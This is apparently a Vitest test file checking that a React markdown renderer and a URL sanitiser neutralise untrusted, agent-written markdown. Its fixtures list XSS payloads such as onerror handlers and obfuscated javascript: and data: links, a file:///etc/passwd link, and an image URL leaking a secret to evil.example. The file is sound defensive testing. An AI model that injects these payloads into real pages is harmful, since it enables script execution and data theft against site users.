import { render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MarkdownView } from "../../src/kit/MarkdownView.tsx";
import { isExternalHref, sanitizeHref } from "../../src/lib/safe-url.ts";

// Agent-written markdown is untrusted: nothing in it may become live script, markup or a request.

const HOSTILE = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="https://ok.example" onclick="alert(1)">x</a>',
  '<form action="javascript:alert(1)"><button>x</button></form>',
  '<p style="background:url(javascript:alert(1))">x</p>',
  "<input autofocus onfocus=alert(1)>",
  "[x](javascript:alert(1))",
  "[x](JaVaScRiPt:alert(1))",
  "[x](java\tscript:alert(1))",
  "[x](&#106;avascript:alert(1))",
  "[x](javascript&colon;alert(1))",
  "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "[x](file:///etc/passwd)",
  "[x](//evil.example/path)",
  "[x](/auth/logout)",
  "[x](https://trusted.example@evil.example/)",
  "[ref]: javascript:alert(1)\n\n[click][ref]",
  "<javascript:alert(1)>",
  "![x](javascript:alert(1))",
  "![](https://evil.example/pixel.gif?leak=secret)",
  '![x"onerror="alert(1)](https://evil.example/a.png)',
  "| a |\n| - |\n| <img src=x onerror=alert(1)> |",
  "- [x] <img src=x onerror=alert(1)>",
  "```html\n<script>alert(1)</script>\n```",
];

const FORBIDDEN_TAGS =
  "script,iframe,object,embed,link,meta,base,style,form,svg,math,img,video,audio";
const SAFE_HREF = /^(https?:|mailto:|#)/;

async function renderMarkdown(markdown: string) {
  const view = render(<MarkdownView markdown={markdown} />);
  // The renderer is lazy: wait until the plain-text fallback has been replaced.
  await waitFor(() => expect(view.container.querySelector("[data-markdown-loading]")).toBeNull());
  return view;
}

function problemsIn(root: Element): string[] {
  const problems: string[] = [];
  for (const element of root.querySelectorAll(FORBIDDEN_TAGS)) {
    problems.push(`<${element.tagName.toLowerCase()}> was rendered`);
  }
  for (const element of root.querySelectorAll("*")) {
    for (const { name } of element.attributes) {
      if (name.startsWith("on") || ["style", "src", "srcdoc", "action"].includes(name)) {
        problems.push(`${element.tagName} has ${name}`);
      }
    }
  }
  for (const anchor of root.querySelectorAll("a")) {
    const href = anchor.getAttribute("href") ?? "";
    if (!SAFE_HREF.test(href)) problems.push(`unsafe href ${href}`);
    if (href.startsWith("http") && !/noopener/.test(anchor.getAttribute("rel") ?? "")) {
      problems.push(`external link ${href} lacks rel=noopener`);
    }
  }
  return problems;
}

describe("MarkdownView sanitisation", () => {
  it.each(HOSTILE)("renders %j inert", async (markdown) => {
    const { container } = await renderMarkdown(markdown);
    expect(problemsIn(container)).toEqual([]);
  });

  it("shows raw HTML as literal text and drops dangerous link targets", async () => {
    const { container } = await renderMarkdown("<b>bold</b> [click me](javascript:alert(1))");
    expect(container.textContent).toContain("<b>bold</b>");
    expect(container.querySelector("b")).toBeNull();
    expect(screen.getByText("click me")).toBeInTheDocument();
    expect(container.querySelector("a")).toBeNull();
  });

  it("never loads images: they become a link to the address", async () => {
    const { container } = await renderMarkdown("![diagram](https://example.com/a.png)");
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("link", { name: /Image: diagram/ })).toHaveAttribute(
      "href",
      "https://example.com/a.png",
    );
  });

  it("opens external links in a new tab without opener or referrer", async () => {
    await renderMarkdown("[docs](https://example.com/docs) [top](#intro)");
    const external = screen.getByRole("link", { name: /docs/ });
    expect(external).toHaveAttribute("target", "_blank");
    expect(external.getAttribute("rel")).toBe("noopener noreferrer nofollow ugc");
    expect(screen.getByRole("link", { name: "top" })).not.toHaveAttribute("target");
  });

  it("re-levels headings below the page's own, without skipping a level", async () => {
    await renderMarkdown("## Starts at two\n\n###### Jumps to six");
    expect(screen.getByRole("heading", { level: 3, name: "Starts at two" })).toBeInTheDocument();
    expect(screen.getByRole("heading", { level: 4, name: "Jumps to six" })).toBeInTheDocument();
  });
});

describe("sanitizeHref", () => {
  it.each([
    ["https://example.com/a?b=1#c", "https://example.com/a?b=1#c"],
    ["  https://example.com  ", "https://example.com/"],
    ["mailto:me@example.com", "mailto:me@example.com"],
    ["#section-1", "#section-1"],
  ])("accepts %s", (input, expected) => {
    expect(sanitizeHref(input)).toBe(expected);
  });

  it.each([
    "",
    " JAVASCRIPT:alert(1)",
    "java\nscript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "blob:https://example.com/x",
    "//example.com",
    "/relative",
    "https://trusted.example@evil.example/",
    "#bad fragment",
    "tel:+1",
  ])("rejects %j", (input) => {
    expect(sanitizeHref(input)).toBeNull();
  });

  it("treats only http(s) as external", () => {
    expect(isExternalHref("https://example.com/")).toBe(true);
    expect(isExternalHref("#x")).toBe(false);
    expect(isExternalHref("mailto:a@b.c")).toBe(false);
  });
});
